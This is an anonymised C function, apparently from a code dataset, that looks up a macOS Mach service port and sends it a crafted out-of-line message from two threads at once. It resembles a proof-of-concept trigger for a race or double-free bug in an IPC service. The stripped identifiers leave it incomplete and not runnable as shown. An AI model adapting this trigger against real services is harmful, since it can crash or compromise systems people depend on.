
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_4__ ;
typedef struct TYPE_7__ TYPE_3__ ;
typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


struct TYPE_8__ {int size; int type; int copy; scalar_t__ deallocate; void* address; } ;
struct TYPE_7__ {int disposition; int type; scalar_t__ name; } ;
struct TYPE_6__ {int msgh_descriptor_count; } ;
struct TYPE_5__ {int msgh_bits; int msgh_id; scalar_t__ msgh_local_port; scalar_t__ msgh_remote_port; } ;
struct dsmsg {int ool_size; TYPE_4__ ool_data; TYPE_3__ ool_port; TYPE_2__ body; TYPE_1__ hdr; int member_0; } ;
typedef int pthread_t ;
typedef int mach_port_t ;
typedef scalar_t__ kern_return_t ;


 scalar_t__ VAR_0 ;
 int FUNC_0 (int ,int ) ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 scalar_t__ VAR_6 ;
 scalar_t__ FUNC_1 (int ,char*,scalar_t__*) ;
 int VAR_7 ;
 int FUNC_2 () ;
 void* FUNC_3 (int) ;
 int FUNC_4 (void*,char,int) ;
 int FUNC_5 (char*,...) ;
 int FUNC_6 (int *,int *,int ,void*) ;
 int FUNC_7 (int ,int *) ;
 char* VAR_8 ;
 scalar_t__ VAR_9 ;
 int FUNC_8 (int ,int *) ;

int FUNC_9() {
  mach_port_t VAR_10;
  FUNC_8(FUNC_2(), &VAR_10);

  kern_return_t VAR_11 = FUNC_1(VAR_10, VAR_8, &VAR_9);
  if(VAR_11 != VAR_0){
    FUNC_5("unable to look up %s\n", VAR_8);
    return 1;
  }

  if (VAR_9 == VAR_6) {
    FUNC_5("bad service port\n");
    return 1;
  }

  FUNC_5("got port\n");

  void* VAR_12 = FUNC_3(0x100000);
  FUNC_4(VAR_12, 'A', 0x1000);

  struct dsmsg VAR_13 = {0};

  VAR_13.hdr.msgh_bits = VAR_1 | FUNC_0(VAR_4, 0);
  VAR_13.hdr.msgh_remote_port = VAR_9;
  VAR_13.hdr.msgh_local_port = VAR_6;
  VAR_13.hdr.msgh_id = 0x2328;

  VAR_13.body.msgh_descriptor_count = 2;

  VAR_13.ool_port.name = VAR_6;
  VAR_13.ool_port.disposition = 20;
  VAR_13.ool_port.type = VAR_3;

  VAR_13.ool_data.address = VAR_12;
  VAR_13.ool_data.size = 0x1000;
  VAR_13.ool_data.deallocate = 0;
  VAR_13.ool_data.copy = VAR_5;
  VAR_13.ool_data.type = VAR_2;

  VAR_13.ool_size = 0x1000;

  pthread_t VAR_14[2] = {0};
  FUNC_6(&VAR_14[0], ((void*)0), VAR_7, (void*)&VAR_13);
  FUNC_6(&VAR_14[1], ((void*)0), VAR_7, (void*)&VAR_13);

  FUNC_7(VAR_14[0], ((void*)0));
  FUNC_7(VAR_14[1], ((void*)0));


  return 0;
}
